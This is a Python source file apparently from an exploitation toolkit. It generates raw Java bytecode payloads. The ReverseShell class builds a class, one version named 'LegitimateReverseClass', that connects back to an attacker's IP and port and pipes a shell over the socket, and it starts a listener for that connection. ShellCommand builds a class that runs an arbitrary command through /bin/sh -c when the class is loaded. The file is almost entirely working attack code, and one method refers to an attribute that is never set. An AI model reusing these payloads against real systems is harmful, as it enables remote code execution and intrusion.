from handlers import ReverseShellListener


class JavaPayload:
    def size(self, sizeof):
        return len(sizeof).to_bytes(2, "big")

    def encode(self, string):
        return string.encode() if type(string) == str else string

    def run(self):
        pass

    def payload(self, class_name):
        raise NotImplementedError()


class ReverseShell(JavaPayload):
    """
    Connect to ip:port and pipe each line received into shell and send back both stdout and stderr
    """

    def __init__(self, ip, port, shell):
        self.ip = self.encode(ip)
        self.port = self.encode(str(port))
        self.shell = self.encode(shell)

    def run(self):
        ReverseShellListener(self.ip.decode(), int(self.port.decode()))

    def payload2(self):
        java = [
            b'\xca\xfe\xba\xbe\x00\x00\x004\x00g\n\x00\x1f\x00+\x08\x00,\x08\x00-\n\x00.\x00/\x08\x000\x07\x001\x07\x002\n\x00\x06\x003\n\x00\x06\x004\n\x00\x06\x005\x07\x006\n\x00\x0b\x007\n\x00%\x008\n\x00%\x009\n\x00\x0b\x008\n\x00%\x00:\n\x00\x0b\x00:\n\x00\x0b\x00;\n\x00&\x00<\n\x00&\x00=\n\x00\'\x00>\n\x00\'\x00?\x05\x00\x00\x00\x00\x00\x00\x002\n\x00@\x00A\n\x00%\x00B\x07\x00C\n\x00%\x00D\n\x00\x0b\x00E\x07\x00F\x07\x00G\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\rStackMapTable\x07\x00H\x07\x00I\x07\x00J\x01\x00\nExceptions\x01\x00\nSourceFile\x01\x00\x1bLegitimateReverseClass.java\x0c\x00 \x00!\x01',
            self.size(self.ip), self.ip, b'\x01', self.size(self.port), self.port, b'\x07\x00K\x0c\x00L\x00M\x01', self.size(self.cmd), self.cmd,
            b'\x01\x00\x18java/lang/ProcessBuilder\x01\x00\x10java/lang/String\x0c\x00 \x00N\x0c\x00O\x00P\x0c\x00Q\x00R\x01\x00\x0fjava/net/Socket\x0c\x00 \x00S\x0c\x00T\x00U\x0c\x00V\x00U\x0c\x00W\x00X\x0c\x00Y\x00Z\x0c\x00[\x00\\\x0c\x00]\x00\\\x0c\x00^\x00_\x0c\x00`\x00!\x07\x00a\x0c\x00b\x00c\x0c\x00d\x00\\\x01\x00\x13java/lang/Exception\x0c\x00e\x00!\x0c\x00f\x00!\x01\x00\x16LegitimateReverseClass\x01\x00\x10java/lang/Object\x01\x00\x11java/lang/Process\x01\x00\x13java/io/InputStream\x01\x00\x14java/io/OutputStream\x01\x00\x11java/lang/Integer\x01\x00\x08parseInt\x01\x00\x15(Ljava/lang/String;)I\x01\x00\x16([Ljava/lang/String;)V\x01\x00\x13redirectErrorStream\x01\x00\x1d(Z)Ljava/lang/ProcessBuilder;\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x01\x00\x16(Ljava/lang/String;I)V\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x01\x00\x0egetErrorStream\x01\x00\x0fgetOutputStream\x01\x00\x18()Ljava/io/OutputStream;\x01\x00\x08isClosed\x01\x00\x03()Z\x01\x00\tavailable\x01\x00\x03()I\x01\x00\x04read\x01\x00\x05write\x01\x00\x04(I)V\x01\x00\x05flush\x01\x00\x10java/lang/Thread\x01\x00\x05sleep\x01\x00\x04(J)V\x01\x00\texitValue\x01\x00\x07destroy\x01\x00\x05close\x00!\x00\x1e\x00\x1f\x00\x00\x00\x00\x00\x01\x00\x01\x00 \x00!\x00\x02\x00"\x00\x00\x01\x88\x00\x06\x00\r\x00\x00\x00\xca*\xb7\x00\x01\x12\x02L\x12\x03M,\xb8\x00\x04>\x12\x05:\x04\xbb\x00\x06Y\x04\xbd\x00\x07Y\x03\x19\x04S\xb7\x00\x08\x04\xb6\x00\t\xb6\x00\n:\x05\xbb\x00\x0bY+\x1d\xb7\x00\x0c:\x06\x19\x05\xb6\x00\r:\x07\x19\x05\xb6\x00\x0e:\x08\x19\x06\xb6\x00\x0f:\t\x19\x05\xb6\x00\x10:\n\x19\x06\xb6\x00\x11:\x0b\x19\x06\xb6\x00\x12\x9a\x00`\x19\x07\xb6\x00\x13\x9e\x00\x10\x19\x0b\x19\x07\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\x08\xb6\x00\x13\x9e\x00\x10\x19\x0b\x19\x08\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\t\xb6\x00\x13\x9e\x00\x10\x19\n\x19\t\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\x0b\xb6\x00\x16\x19\n\xb6\x00\x16\x14\x00\x17\xb8\x00\x19\x19\x05\xb6\x00\x1aW\xa7\x00\x08:\x0c\xa7\xff\x9e\x19\x05\xb6\x00\x1c\x19\x06\xb6\x00\x1d\xb1\x00\x01\x00\xb1\x00\xb7\x00\xba\x00\x1b\x00\x02\x00#\x00\x00\x00j\x00\x1a\x00\x00\x00\t\x00\x04\x00\x0b\x00\x07\x00\x0c\x00\n\x00\r\x00\x0f\x00\x0e\x00\x13\x00\x0f\x00,\x00\x10\x007\x00\x11\x00L\x00\x12\x00Z\x00\x13\x00b\x00\x14\x00j\x00\x15\x00w\x00\x16\x00\x7f\x00\x17\x00\x8c\x00\x18\x00\x94\x00\x19\x00\xa1\x00\x1a\x00\xa6\x00\x1b\x00\xab\x00\x1c\x00\xb1\x00\x1e\x00\xb7\x00\x1f\x00\xba\x00!\x00\xbc\x00"\x00\xbf\x00$\x00\xc4\x00%\x00\xc9\x00&\x00$\x00\x00\x004\x00\x07\xff\x00Z\x00\x0c\x07\x00\x1e\x07\x00\x07\x07\x00\x07\x01\x07\x00\x07\x07\x00%\x07\x00\x0b\x07\x00&\x07\x00&\x07\x00&\x07\x00\'\x07\x00\'\x00\x00\x07\x14\x14\x14X\x07\x00\x1b\x04\x00(\x00\x00\x00\x04\x00\x01\x00\x1b\x00\x01\x00)\x00\x00\x00\x02\x00*']
        return b"".join(java)

    def payload(self, class_name):
        class_name = self.encode(class_name)
        java = [
            b'\xca\xfe\xba\xbe\x00\x00\x004\x00g\n\x00\x1f\x00+\x08\x00,\x08\x00-\n\x00.\x00/\x08\x000\x07\x001\x07\x002\n\x00\x06\x003\n\x00\x06\x004\n\x00\x06\x005\x07\x006\n\x00\x0b\x007\n\x00%\x008\n\x00%\x009\n\x00\x0b\x008\n\x00%\x00:\n\x00\x0b\x00:\n\x00\x0b\x00;\n\x00&\x00<\n\x00&\x00=\n\x00\'\x00>\n\x00\'\x00?\x05\x00\x00\x00\x00\x00\x00\x002\n\x00@\x00A\n\x00%\x00B\x07\x00C\n\x00%\x00D\n\x00\x0b\x00E\x07\x00F\x07\x00G\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\rStackMapTable\x07\x00H\x07\x00I\x07\x00J\x01\x00\nExceptions\x01\x00\nSourceFile\x01',
            self.size(class_name + b'.java'), class_name + b'.java',
            b'\x0c\x00 \x00!\x01',
            self.size(self.ip), self.ip, b'\x01', self.size(self.port), self.port, b'\x07\x00K\x0c\x00L\x00M\x01', self.size(self.shell), self.shell,
            b'\x01\x00\x18java/lang/ProcessBuilder\x01\x00\x10java/lang/String\x0c\x00 \x00N\x0c\x00O\x00P\x0c\x00Q\x00R\x01\x00\x0fjava/net/Socket\x0c\x00 \x00S\x0c\x00T\x00U\x0c\x00V\x00U\x0c\x00W\x00X\x0c\x00Y\x00Z\x0c\x00[\x00\\\x0c\x00]\x00\\\x0c\x00^\x00_\x0c\x00`\x00!\x07\x00a\x0c\x00b\x00c\x0c\x00d\x00\\\x01\x00\x13java/lang/Exception\x0c\x00e\x00!\x0c\x00f\x00!\x01',
            self.size(class_name), class_name,
            b'\x01\x00\x10java/lang/Object\x01\x00\x11java/lang/Process\x01\x00\x13java/io/InputStream\x01\x00\x14java/io/OutputStream\x01\x00\x11java/lang/Integer\x01\x00\x08parseInt\x01\x00\x15(Ljava/lang/String;)I\x01\x00\x16([Ljava/lang/String;)V\x01\x00\x13redirectErrorStream\x01\x00\x1d(Z)Ljava/lang/ProcessBuilder;\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x01\x00\x16(Ljava/lang/String;I)V\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x01\x00\x0egetErrorStream\x01\x00\x0fgetOutputStream\x01\x00\x18()Ljava/io/OutputStream;\x01\x00\x08isClosed\x01\x00\x03()Z\x01\x00\tavailable\x01\x00\x03()I\x01\x00\x04read\x01\x00\x05write\x01\x00\x04(I)V\x01\x00\x05flush\x01\x00\x10java/lang/Thread\x01\x00\x05sleep\x01\x00\x04(J)V\x01\x00\texitValue\x01\x00\x07destroy\x01\x00\x05close\x00!\x00\x1e\x00\x1f\x00\x00\x00\x00\x00\x01\x00\x01\x00 \x00!\x00\x02\x00"\x00\x00\x01\x88\x00\x06\x00\r\x00\x00\x00\xca*\xb7\x00\x01\x12\x02L\x12\x03M,\xb8\x00\x04>\x12\x05:\x04\xbb\x00\x06Y\x04\xbd\x00\x07Y\x03\x19\x04S\xb7\x00\x08\x04\xb6\x00\t\xb6\x00\n:\x05\xbb\x00\x0bY+\x1d\xb7\x00\x0c:\x06\x19\x05\xb6\x00\r:\x07\x19\x05\xb6\x00\x0e:\x08\x19\x06\xb6\x00\x0f:\t\x19\x05\xb6\x00\x10:\n\x19\x06\xb6\x00\x11:\x0b\x19\x06\xb6\x00\x12\x9a\x00`\x19\x07\xb6\x00\x13\x9e\x00\x10\x19\x0b\x19\x07\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\x08\xb6\x00\x13\x9e\x00\x10\x19\x0b\x19\x08\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\t\xb6\x00\x13\x9e\x00\x10\x19\n\x19\t\xb6\x00\x14\xb6\x00\x15\xa7\xff\xee\x19\x0b\xb6\x00\x16\x19\n\xb6\x00\x16\x14\x00\x17\xb8\x00\x19\x19\x05\xb6\x00\x1aW\xa7\x00\x08:\x0c\xa7\xff\x9e\x19\x05\xb6\x00\x1c\x19\x06\xb6\x00\x1d\xb1\x00\x01\x00\xb1\x00\xb7\x00\xba\x00\x1b\x00\x02\x00#\x00\x00\x00j\x00\x1a\x00\x00\x00\t\x00\x04\x00\x0b\x00\x07\x00\x0c\x00\n\x00\r\x00\x0f\x00\x0e\x00\x13\x00\x0f\x00,\x00\x10\x007\x00\x11\x00L\x00\x12\x00Z\x00\x13\x00b\x00\x14\x00j\x00\x15\x00w\x00\x16\x00\x7f\x00\x17\x00\x8c\x00\x18\x00\x94\x00\x19\x00\xa1\x00\x1a\x00\xa6\x00\x1b\x00\xab\x00\x1c\x00\xb1\x00\x1e\x00\xb7\x00\x1f\x00\xba\x00!\x00\xbc\x00"\x00\xbf\x00$\x00\xc4\x00%\x00\xc9\x00&\x00$\x00\x00\x004\x00\x07\xff\x00Z\x00\x0c\x07\x00\x1e\x07\x00\x07\x07\x00\x07\x01\x07\x00\x07\x07\x00%\x07\x00\x0b\x07\x00&\x07\x00&\x07\x00&\x07\x00\'\x07\x00\'\x00\x00\x07\x14\x14\x14X\x07\x00\x1b\x04\x00(\x00\x00\x00\x04\x00\x01\x00\x1b\x00\x01\x00)\x00\x00\x00\x02\x00*'
        ]
        return b''.join(java)


class ShellCommand(JavaPayload):
    """
    Executes a command using `/bin/sh -c "cmd"`
    """

    def __init__(self, cmd):
        self.cmd = self.encode(cmd)

    def payload(self, class_name):
        class_name = self.encode(class_name)
        java = [
            b'\xca\xfe\xba\xbe\x00\x00\x004\x00#\n\x00\n\x00\x13\n\x00\x14\x00\x15\x07\x00\x16\x08\x00\x17\x08\x00\x18\x08\x00\x19\n\x00\x14\x00\x1a\x07\x00\x1b\x07\x00\x1c\x07\x00\x1d\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x18',
            class_name,
            b'.java\x0c\x00\x0b\x00\x0c\x07\x00\x1e\x0c\x00\x1f\x00 \x01\x00\x10java/lang/String\x01\x00\x07/bin/sh\x01\x00\x02-c\x01',
            self.size(self.cmd), self.cmd,
            b'\x0c\x00!\x00"\x01\x00\x13java/lang/Exception\x01\x00\x13',
            class_name,
            b'\x01\x00\x10java/lang/Object\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava/lang/Process;\x00!\x00\t\x00\n\x00\x00\x00\x00\x00\x02\x00\x01\x00\x0b\x00\x0c\x00\x01\x00\r\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x0e\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x0f\x00\x0c\x00\x01\x00\r\x00\x00\x00T\x00\x05\x00\x01\x00\x00\x00\x1f\xb8\x00\x02\x06\xbd\x00\x03Y\x03\x12\x04SY\x04\x12\x05SY\x05\x12\x06S\xb6\x00\x07W\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\x1a\x00\x1d\x00\x08\x00\x02\x00\x0e\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\x1a\x00\x05\x00\x1e\x00\x06\x00\x10\x00\x00\x00\x07\x00\x02]\x07\x00\x08\x00\x00\x01\x00\x11\x00\x00\x00\x02\x00\x12'
        ]
        return b''.join(java)
